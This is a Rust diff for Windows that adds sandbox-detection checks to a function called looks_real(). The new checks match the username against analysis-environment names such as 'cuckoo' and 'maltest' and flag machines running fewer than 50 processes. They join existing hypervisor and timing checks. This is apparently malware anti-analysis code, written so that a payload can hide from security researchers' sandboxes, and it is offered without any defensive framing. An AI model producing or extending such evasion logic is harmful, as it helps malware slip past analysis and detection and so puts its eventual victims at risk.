@@ -3,6 +3,40 @@ use windows_sys::Win32::System::SystemInformation::{
     GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX, GetSystemInfo, SYSTEM_INFO,
 };
 
+#[cfg(target_os = "windows")]
+unsafe fn username_is_sandbox() -> bool {
+    use windows_sys::Win32::System::WindowsProgramming::GetUserNameA;
+    let mut buf = [0u8; 64];
+    let mut len = 64u32;
+    if GetUserNameA(buf.as_mut_ptr(), &mut len) == 0 { return false; }
+    let lower: Vec<u8> = buf[..len.saturating_sub(1) as usize]
+        .iter().map(|&b| b.to_ascii_lowercase()).collect();
+    const BAD: &[&[u8]] = &[b"sandbox", b"maltest", b"virus", b"cuckoo", b"john", b"test"];
+    BAD.iter().any(|&n| lower == n)
+}
+
+#[cfg(target_os = "windows")]
+unsafe fn process_count_low() -> bool {
+    use windows_sys::Win32::{
+        Foundation::CloseHandle,
+        System::Diagnostics::ToolHelp::{
+            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+        },
+    };
+    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if snap == -1isize { return false; }
+    let mut entry: PROCESSENTRY32W = core::mem::zeroed();
+    entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+    let mut count = 0usize;
+    if Process32FirstW(snap, &mut entry) != 0 {
+        count += 1;
+        while Process32NextW(snap, &mut entry) != 0 { count += 1; }
+    }
+    CloseHandle(snap);
+    count < 50
+}
+
 #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
 unsafe fn hypervisor_bit_set() -> bool {
     let ecx: u32;
@@ -138,6 +172,12 @@ pub unsafe fn looks_real() -> bool {
 
     #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
     if time_accelerated() { return false; }
+
+    #[cfg(target_os = "windows")]
+    if username_is_sandbox() { return false; }
+
+    #[cfg(target_os = "windows")]
+    if process_count_low() { return false; }
 
     true
 }
